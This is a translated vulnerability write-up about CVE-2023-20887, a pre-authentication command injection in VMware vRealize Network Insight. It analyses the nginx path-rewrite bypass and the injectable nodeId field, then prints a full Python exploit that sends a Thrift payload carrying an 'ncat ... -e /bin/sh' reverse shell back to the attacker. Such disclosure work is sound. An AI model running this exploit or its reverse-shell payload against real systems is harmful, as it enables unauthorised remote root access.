# Vmware VRealize NetWork Insight 系统中的预身份验证RCE

> 翻译原文链接：<https://summoning.team/blog/vmware-vrealize-network-insight-rce-> cve-2023-20887/>
>
> 翻译主题：本片文章主要概述了寻找格式化漏洞参数，和绕过nginx重写规则的绕过，实现VMware的远程代码执行的过程。

![](./img/133974906992034293.png)

## 介绍

我最近发现了多个在Vmware vRealize Network Insight中的漏洞，在报告了漏洞了之后分配了3个CVE编号：

  * CVE-2023-20887
  * CVE-2023-20888
  * CVE-2023-20889

## 漏洞函数分析

找到路径`/etc/nginx/sites-available/vnera`下的nginx的配置文件，从配置代码来看，当终端端点访问443端口的时候限制了访问`/saasresttosaasservlet`目录。  
可以看到这个规则限制了只允许从本地localhost发起的请求，成功访问端点的时候会使用9090端口来代理请求，这个端口上运行着一个Apache
Thrift RPC
服务，这是一个Facebook开发的远程过程调用框架，其中Thrift是一种接口描述语言和二进制通讯协议，它被用来定义和创建跨语言的服务。它被当作一个远程过程调用（RPC）框架来使用

    
    
    server {
    [..SNIP..]
        location /saasresttosaasservlet {
            allow 127.0.0.1;
            deny all;
            rewrite ^/saas(.*)$ /$1 break;
            proxy_pass http://127.0.0.1:9090;
            proxy_redirect off;
            proxy_buffering off;
            proxy_set_header        Host            $host;
            proxy_set_header        X-Real-IP       $remote_addr;
            proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
        }
        location /saas {
            rewrite ^/saas(.*)$ /$1 break;
            proxy_pass http://127.0.0.1:9090;
            proxy_redirect off;
            proxy_buffering off;
            proxy_set_header        Host            $host;
            proxy_set_header        X-Real-IP       $remote_addr;
            proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
        }
    
    }
    

关于Thrift是一套创建客户端和服务器端的栈结构，使用java创建一个Thrift服务的方法如下：

    
    
    enum PhoneType {
     HOME,
     WORK,
     MOBILE,
     OTHER
    }
    
    struct Phone {
     1: i32 id,
     2: string number,
     3: PhoneType type
    }
    

其中该服务框架与SOAP相比，使用了二进制格式，跨语言序列化的代价低，并且是一个非常干净小的库，没有额外的XML配置文件和香瓜的呢编码框架，其中应用层通讯格式与序列化层通讯格式可独立修改，不互相影响。

![](./img/3483618168338039907.png)

关于RPC服务框架的映射关系如下：

Service | Protocol | URL  
---|---|---  
CollectorToSaasCommunication | TBinaryProtocol | /collectortosaasservlet/*  
FedPeerToSaasCommunication | TBinaryProtocol | /fedpeertosaasservlet/*  
SaasToCollectorCommunication | TBinaryProtocol | /saastocollectorservlet/*  
SaasToFedPeerCommunication | TBinaryProtocol | /saastofedpeerservlet/*  
SaasToCollectorDataLink | TBinaryProtocol | /saastocollectordatalinkservlet/*  
RestToSaasCommunication | TJSONProtocol | /resttosaasservlet/*  
GenericSaasService | TJSONProtocol | /genericsaasservlet/*  
  
当访问9090端口上的/resttosaasservlet时RestToSaasCommunication会做出响应请求，然后Thift服务响应处理的对应代码如下：

    
    
    private static <I extends AsyncIface> Map<String, AsyncProcessFunction<I, ? extends TBase, ?>> getProcessMap(Map<String, AsyncProcessFunction<I, ? extends TBase, ?>> processMap) {
    2               processMap.put("executeCommand", new executeCommand());
    3               processMap.put("executeInfraCommand", new executeInfraCommand());
    4               processMap.put("getDataSourceList", new getDataSourceList());
    5               processMap.put("getDataSourceListWithWebProxyConfigured", new getDataSourceListWithWebProxyConfigured());
    6               processMap.put("getDataSourceListByWebProxyId", new getDataSourceListByWebProxyId());
    7               processMap.put("getDataSourceMapByDpIds", new getDataSourceMapByDpIds());
    8               processMap.put("getAllDataSourcesMap", new getAllDataSourcesMap());
    9               processMap.put("getOnDemandQueryResponseFromCollector", new getOnDemandQueryResponseFromCollector());
    10              processMap.put("setDataSource", new setDataSource());
    11              processMap.put("removeDataSource", new removeDataSource());
    12              processMap.put("validateCredential", new validateCredential());
    13              processMap.put("unpairPeer", new unpairPeer());
    14              processMap.put("startDataSource", new startDataSource());
    15              processMap.put("startDataSources", new startDataSources());
    16              processMap.put("stopDataSource", new stopDataSource());
    17              processMap.put("updateDataSource", new updateDataSource());
    18              processMap.put("collectConfigNow", new collectConfigNow());
    19              processMap.put("updateNode", new updateNode());
    20              processMap.put("getNodesInfo", new getNodesInfo());
    21              processMap.put("getCustomersNodesInfo", new getCustomersNodesInfo());
    22              processMap.put("getProxyNodesInfo", new getProxyNodesInfo());
    23              processMap.put("getFedPeerNodesInfo", new getFedPeerNodesInfo());
    24              processMap.put("deleteNode", new deleteNode());
    25              processMap.put("forcedDeleteNode", new forcedDeleteNode());
    26              processMap.put("getDataSourceConfiguration", new getDataSourceConfiguration());
    27              processMap.put("getDataSourceId", new getDataSourceId());
    28              processMap.put("getDataSourceHostKeys", new getDataSourceHostKeys());
    29              processMap.put("sendData", new sendData());
    30              processMap.put("getTenantProxyDataSourceList", new getTenantProxyDataSourceList());
    31              processMap.put("getSharedProxyDataSourceList", new getSharedProxyDataSourceList());
    32              processMap.put("sendDataToGrid", new sendDataToGrid());
    33              processMap.put("enableSupportTunnel", new enableSupportTunnel());
    34              processMap.put("disableSupportTunnel", new disableSupportTunnel());
    35              processMap.put("checkSupportTunnel", new checkSupportTunnel());
    36              processMap.put("enableOnlineUpgrade", new enableOnlineUpgrade());
    37              processMap.put("disableOnlineUpgrade", new disableOnlineUpgrade());
    38              processMap.put("checkOnlineUpgrade", new checkOnlineUpgrade());
    39              processMap.put("createSupportBundle", new createSupportBundle()); // urmum
    40              processMap.put("sendUpgradeTargetManifest", new sendUpgradeTargetManifest());
    41              processMap.put("getSystemInfo", new getSystemInfo());
    42              processMap.put("createTenantSystem", new createTenantSystem());
    43              processMap.put("deleteTenantSystem", new deleteTenantSystem());
    44              processMap.put("createPlatformNode", new createPlatformNode());
    45              processMap.put("sendNotifications", new sendNotifications());
    46              processMap.put("setSystemPreference", new setSystemPreference());
    47              processMap.put("toggleFipsMode", new toggleFipsMode());
    48              return processMap;
    49          }
    

其中一个可变的步骤是在`createSupportBundle`，而这个程序会需要一个结构体，实现的结构体如下：

    
    
    1
    2       public static class createSupportBundle_args implements TBase<createSupportBundle_args, _Fields>, Serializable, Cloneable, Comparable<createSupportBundle_args> {
    3           private static final TStruct STRUCT_DESC = new TStruct("createSupportBundle_args");
    4           private static final TField CUSTOMER_ID_FIELD_DESC = new TField("customerId", (byte)11, (short)1);
    5           private static final TField NODE_ID_FIELD_DESC = new TField("nodeId", (byte)11, (short)2);
    6           private static final TField REQUEST_ID_FIELD_DESC = new TField("requestId", (byte)11, (short)3);
    7           private static final TField EVICTION_REQUEST_IDS_FIELD_DESC = new TField("evictionRequestIds", (byte)15, (short)4);
    8           private static final SchemeFactory STANDARD_SCHEME_FACTORY = new createSupportBundle_argsStandardSchemeFactory();
    9           private static final SchemeFactory TUPLE_SCHEME_FACTORY = new createSupportBundle_argsTupleSchemeFactory();
    10          @Nullable
    11          public String customerId;
    12          @Nullable
    13          public String nodeId;
    14          @Nullable
    15          public String requestId;
    16          @Nullable
    17          public List<String> evictionRequestIds;
    18          public static final Map<_Fields, FieldMetaData> metaDataMap;
    19
    20          public createSupportBundle_args() {
    21          }
    22
    23          public createSupportBundle_args(String customerId, String nodeId, String requestId, List<String> evictionRequestIds) {
    24              this();
    25              this.customerId = customerId;
    26              this.nodeId = nodeId;
    27              this.requestId = requestId;
    28              this.evictionRequestIds = evictionRequestIds;
    29          }
    30
    31          public createSupportBundle_args(createSupportBundle_args other) {
    32              if (other.isSetCustomerId()) {
    33                  this.customerId = other.customerId;
    34              }
    35
    36              if (other.isSetNodeId()) {
    37                  this.nodeId = other.nodeId;
    38              }
    39
    40              if (other.isSetRequestId()) {
    41                  this.requestId = other.requestId;
    42              }
    43
    44              if (other.isSetEvictionRequestIds()) {
    45                  List<String> __this__evictionRequestIds = new ArrayList(other.evictionRequestIds);
    46                  this.evictionRequestIds = __this__evictionRequestIds;
    47              }
    48
    49          }
    50
    51          public createSupportBundle_args deepCopy() {
    52              return new createSupportBundle_args(this);
    53          }
    54
    55          public void clear() {
    56              this.customerId = null;
    57              this.nodeId = null;
    58              this.requestId = null;
    59              this.evictionRequestIds = null;
    60          }
    

上面的代码会被转化为下面的数据结构：

    
    
    struct {
        customerId,
        nodeId,
        requestId,
        evictionRequestIDs
    }
    

从变量名`createSupportBundle`来看，顾名思义，它的功能是创建一个支持包。

    
    
    1   public Result createSupportBundle(String customerId, String nodeId, String requestId, List<String> evictionRequestIds) {
    2               ServiceThriftListener.logger.info("Request support bundle for customerId {} requestId {} nodeId {}", new Object[]{customerId, requestId, nodeId});
    3               if (!evictionRequestIds.isEmpty()) {
    4                   for(int i = 0; i < evictionRequestIds.size(); ++i) {
    5                       if (!SupportRequestStore.isValidateRequestId((String)evictionRequestIds.get(i))) {
    6                           ServiceThriftListener.logger.error("Provided invalid evictionRequestId {}.", evictionRequestIds.get(i));
    7                           return new Result(ERROR_CODE.FAILED.getValue(), "Provided invalid eviction requestId " + (String)evictionRequestIds.get(i));
    8                       }
    9                   }
    10              }
    11
    12              ServiceThriftListener.supportBundleExecutor.submit(() -> {
    13                  int cidInt = Integer.parseInt(customerId);
    14                  String nodeType = this.isLocalNodeId(nodeId) ? "platform" : "proxy";
    15                  SupportRequestStore.Policy policy = ServiceThriftListener.supportRequestStore.getPolicy(Type.SUPPORT_BUNDLE);
    16                  Integer maxFiles = policy != null ? policy.getMaxRequests() : null;
    17                  String vcfLogToken = this.getVCFLogToken();
    18
    19                  try {
    20                      ScriptUtils.evictLocalSupportBundles(nodeType, nodeId, evictionRequestIds, maxFiles, vcfLogToken);
    21                      ScriptUtils.evictPublishedSupportBundles(nodeType, nodeId, evictionRequestIds, maxFiles, vcfLogToken);
    22                  [..SNIP..]
    

可以在上面这段代码第21行看到，`nodeId`变量将被传递给`ScriptUtils.class#evictPublishedSupportBundles`。  
这个方法在第16行做了检查，确保其中的参数不为空：如果 policy 不为 null，则将调用 policy.getMaxRequests()
方法并将其结果赋给 maxFiles；如果 policy 为 null，则将 maxFiles 赋为 null 值。  
在第18行开始，这段代码尝试调用两个方法来清理支持包，如果在调用这两个方法时发生了异常，例如传递了无效的参数、文件系统错误等，程序会捕获并处理异常。

    
    
    1       public static synchronized void evictPublishedSupportBundles(String nodeType, String nodeId, List<String> evictionRequestIds, Integer maxFiles, String vcfLogToken) throws Exception {
    2           Preconditions.checkArgument(NullOrEmpty.isFalse(nodeId, true));
    3           Iterator var5 = CollectionUtils.emptyIfNull(evictionRequestIds).iterator();
    4
    5           while(var5.hasNext()) {
    6               String r = (String)var5.next();
    7               String filename = getSupportBundlePublishPath(getSupportBundleFilename(nodeType, nodeId, r, vcfLogToken));
    8               Preconditions.checkArgument(!filename.contains("*"));
    9               boolean deleted = ArkinFileUtils.delete(filename, FsType.DEFAULT);
    10              if (!deleted) {
    11                  logger.error("Could not delete file {}", filename);
    12              }
    13          }
    14
    15          if (maxFiles != null) {
    16              String evictCommand = String.format("sudo ls -tp %s/sb.%s.%s*.tar.gz | grep -v '/$' | tail -n +%d | xargs -I {} rm -- {}", "/ui-support-bundles", nodeType, nodeId, maxFiles);
    17              if (CommonUtils.isPlatformCluster()) {
    18                  evictCommand = String.format("%s %s %s", "sudo /home/ubuntu/build-target/saasservice/cleansb.sh", nodeId, nodeType);
    19              }
    20
    21              int evictRet = runCommand(evictCommand);
    22              if (evictRet != 0) {
    23                  logger.error("Could not cleanup command {}, command returned {}", evictCommand, evictRet);
    24              }
    25          }
    26
    27      }
    

注意这段代码的第16行到第18行，可以发现这里可能存在漏洞，第16行代码：`String evictCommand =
String.format("sudo ls -tp %s/sb.%s.%s*.tar.gz | grep -v '/$' | tail -n +%d |
xargs -I {} rm -- {}", "/ui-support-bundles", nodeType, nodeId, maxFiles);`

首先定义了一个名为evictCommand的字符串变量，用于存储生成的命令，然后使用String.format方法构造命令字符串。

  * "sudo ls -tp %s/sb.%s.%s*.tar.gz"：这部分命令使用ls命令列出特定目录下以sb.开头，后面跟着nodeType、nodeId和任意字符的.tar.gz文件。
  * "%s/sb.%s.%s*.tar.gz"：这部分是格式化字符串中的占位符，将被后面的参数依次替换。第一个%s代表"/ui-support-bundles"，第二个%s代表nodeType，第三个%s代表nodeId。
  * | grep -v '/$'：在ls命令输出的结果中过滤掉目录（以/结尾的项）。
  * | tail -n +%d：取tail命令输出的结果中从第maxFiles行开始的所有行。
  * | xargs -I {} rm -- {}：将每一行作为参数传递给rm命令，用于删除对应的文件。

我们可以使用`nodeId`参数来实现命令注入，替代其中`nodeId`的值，并且在第18行也看到我们传入了`nodeId`参数，进行了格式化字符串。

`evictCommand = String.format("%s %s %s", "sudo /home/ubuntu/build-target/saasservice/cleansb.sh", nodeId, nodeType);`

这段代码传入了两个参数，一个是`nodeId`，另一个参数是`nodeType`，这段代码生成了一个用于执行特定清理脚本的命令字符串，脚本的路径固定为/home/ubuntu/build-target/saasservice/cleansb.sh，生成的命令是以超级用户sudo来执行的。  
所以我们的目标是攻击函数`evictPublishedSupportBundles`，我们需要从外部制作一个Thrift请求，然后利用`createSupportBundle`函数，现在的问题是首先需要绕过我们前面所说的限制，也就是绕过外部限制访问这个问题。

## 外部请求限制绕过方法

一般情况下，我们为了访问/saasresttosaasservle应该使用下面的请求：

    
    
    https://VRNI-IP/saasresttosaasservlet --> MATCH location /saasresttosaasservlet ALLOW 127.0.0.1
    

很不幸，我访问<https://VRNI-IP/saasresttosaasservlet被拒绝了，我需要花一点时间来看看nginx的配置代码：>

    
    
    server {
    [..SNIP..]
        location /saasresttosaasservlet {
            allow 127.0.0.1;
            deny all;
            rewrite ^/saas(.*)$ /$1 break;
            proxy_pass http://127.0.0.1:9090;
            proxy_redirect off;
            proxy_buffering off;
            proxy_set_header        Host            $host;
            proxy_set_header        X-Real-IP       $remote_addr;
            proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
        }
        location /saas {
            rewrite ^/saas(.*)$ /$1 break;
            proxy_pass http://127.0.0.1:9090;
            proxy_redirect off;
            proxy_buffering off;
            proxy_set_header        Host            $host;
            proxy_set_header        X-Real-IP       $remote_addr;
            proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
        }
    
    }
    

我们理解一下上面nginx的代码的意思：

  1. `server { ... }`: 一个server块，定义了NGINX服务器的配置。
  2. `location /saasresttosaasservlet { ... }`: 一个location块，用于匹配以"/saasresttosaasservlet"开头的URL路径。
  3. `allow 127.0.0.1;`: 允许来自IP地址127.0.0.1（本地主机）的请求访问该location。
  4. `deny all;`: 禁止所有其他IP地址的请求访问该location。
  5. `rewrite ^/saas(.*)$ /$1 break;`: 重写URL，将以"/saas"开头的路径重写为去除"/saas"部分后的路径。
  6. `proxy_pass http://127.0.0.1:9090;`: 将请求转发给地址为"[http://127.0.0.1:9090](http://127.0.0.1:9090/)"的后端服务器。
  7. `proxy_redirect off;`: 禁止在响应中修改后端服务器返回的Location头信息。
  8. `proxy_buffering off;`: 禁用缓冲，将响应立即发送到客户端而不进行缓存。
  9. `proxy_set_header Host $host;`: 设置传递给后端服务器的Host头信息为客户端请求的Host头信息。
  10. `proxy_set_header X-Real-IP $remote_addr;`: 设置传递给后端服务器的X-Real-IP头信息为客户端的真实IP地址。
  11. `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`: 设置传递给后端服务器的X-Forwarded-For头信息，包含了客户端的真实IP地址以及代理服务器的IP地址。
  12. `location /saas { ... }`: 这是另一个location块，用于匹配以"/saas"开头的URL路径。
  13. `rewrite ^/saas(.*)$ /$1 break;`: 重写URL，将以"/saas"开头的路径重写为去除"/saas"部分后的路径，与前面的location块相同。
  14. `proxy_pass http://127.0.0.1:9090;`: 将请求转发给地址为"[http://127.0.0.1:9090](http://127.0.0.1:9090/)"的后端服务器，与前面的location块相同。
  15. `proxy_redirect off;`: 禁止在响应中修改后端服务器返回的Location头信息，与前面的location块相同。
  16. `proxy_buffering off;`: 禁用缓冲，将响应立即发送到客户端而不进行缓存，与前面的location块相同。
  17. `proxy_set_header Host $host;`: 设置传递给后端服务器的Host头信息为客户端请求的Host头信息，与前面的location块相同。
  18. `proxy_set_header X-Real-IP $remote_addr;`: 设置传递给后端服务器的X-Real-IP头信息为客户端的真实IP地址，与前面的location块相同。
  19. `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`: 设置传递给后端服务器的X-Forwarded-For头信息，包含了客户端的真实IP地址以及代理服务器的IP地址，与前面的location块相同。

注意第二个location匹配的方法，在第13点可以发现，当匹配到/saas时，我们的规则会被重写，去除"/saas"，当用户访问
"<https://VRNI-IP/saas./resttosaasservlet>" 时，该规则会将 "/saas./resttosaasservlet"
中的 "/saas" 部分去除，并将剩余部分 "/resttosaasservlet" 作为新的路径进行处理，最后会将原始请求重写为
"[https://VRNI-IP/./resttosaasservlet"，后端"https://127.0.0.1:9090"将会处理该请求，所以我们可以使用下面的方法来绕过：](https://VRNI-IP/./resttosaasservlet)

    
    
    https://VRNI-IP/saas./resttosaasservlet --> MATCH location /saas rewrite ^/saas(.*)$ /$1 PROXY_PASS
    

经过nginx处理，相当于接受以下请求：

    
    
    https://VRNI-IP/./resttosaasservlet
    

## 漏洞攻击代码：

    
    
    """
    VMWare Aria Operations for Networks (vRealize Network Insight) unauthenticated RCE
    Version: 6.8.0.1666364233
    Exploit By: Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
    """
    import warnings
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    import requests
    from threading import Thread
    import argparse
    from telnetlib import Telnet
    import socket
    requests.packages.urllib3.disable_warnings()
    
    argparser = argparse.ArgumentParser()
    argparser.add_argument("--url", help="VRNI URL", required=True)
    argparser.add_argument("--attacker", help="Attacker listening IP:PORT (example: 192.168.1.10:1337)", required=True)
    
    args = argparser.parse_args()
    
    def handler():
        print("(*) Starting handler")
        t = Telnet()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((args.attacker.split(":")[0],int(args.attacker.split(":")[1]))) # 使用 bind 方法将绑定到攻击者的 IP 地址和端口号上
        s.listen(1) # 参数 1 表示最多允许一个等待中的连接
        conn, addr= s.accept() # 阻塞程序执行，等待接受传入的连接并返回连接对象 conn 和客户端地址 addr
        print(f"(+) Received connection from {addr[0]}")
        t.sock = conn #  sock 属性设置为连接对象 conn，以便与客户端实现交互。
        print("(+) pop thy shell! (it's ready)")
        t.interact() # 该方法启动与客户端的交互会话
    
    def start_handler():
        t = Thread(target=handler) # target=handler 表示在线程中要执行的函数是 handler，创建了一个Thread()对象
        t.daemon = True # 线程的 daemon 属性设置为 True。这意味着当主线程退出时，该子线程也会自动退出，如果设置为False，则子线程不会退出。
        t.start() # 开始执行 handler 函数
    
    def exploit():
        url = args.url + "/saas./resttosaasservlet" # 构造攻击url请求路径，绕过nginx本地访问限制
        revshell = f'ncat {args.attacker.split(":")[0]} {args.attacker.split(":")[1]} -e /bin/sh'
        payload = """[1,"createSupportBundle",1,0,{"1":{"str":"1111"},"2":{"str":"`"""+revshell+"""`"},"3":{"str":"value3"},"4":{"lst":["str",2,"AAAA","BBBB"]}}]"""
        result = requests.post( url, 
                                headers={
                                    "Content-Type":"application/x-thrift"}, 
                                    verify=False, 
                                    data=payload, # 发送payload攻击代码
                                    proxies={"http":"http://localhost:8080","https":"http://localhost:8080"}
                                    )
    
    start_handler()
    exploit()
    
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("(*) Exiting...")
        exit(0)
    

在攻击代码函数exploit()函数中，使用reverse定义了一个格式化字符串，利用ncat命令来建立一个反向 shell
连接，其中args.attacker是一个分隔符为冒号的字符串，它表示攻击者的 IP 地址和端口号，代码通过split(":")方法将其拆分为 IP
地址和端口号两部分。  
然后，使用拆分得到的 IP 地址和端口号作为参数传递给ncat命令。-e
/bin/sh表示在建立连接后执行/bin/sh命令，即启动一个交互式的shell。  
`ncat 192.168.116.119 1337 -e /bin/sh`  
定义的payload变量，其中整理格式如下：

    
    
    payload = """
    [
        1,
        "createSupportBundle", # 触发漏洞函数
        1,
        0,
        {
            "1": {"str": "1111"},
            "2": {"str": "`""" + revshell + """`"},
            "3": {"str": "value3"},
            "4": {"lst": ["str", 2, "AAAA", "BBBB"]}
        }
    ]
    """
    

## 远程代码执行结果

该漏洞不需要普通用户权限，只要能访问就可以实现远程RCE。  
成功得到shell权限，通过命令注入实现远程代码执行。  
![](./img/8399654515080499726.png)

![](./img/4649867004866387223.png)

![](./img/3688688739298838273.png)

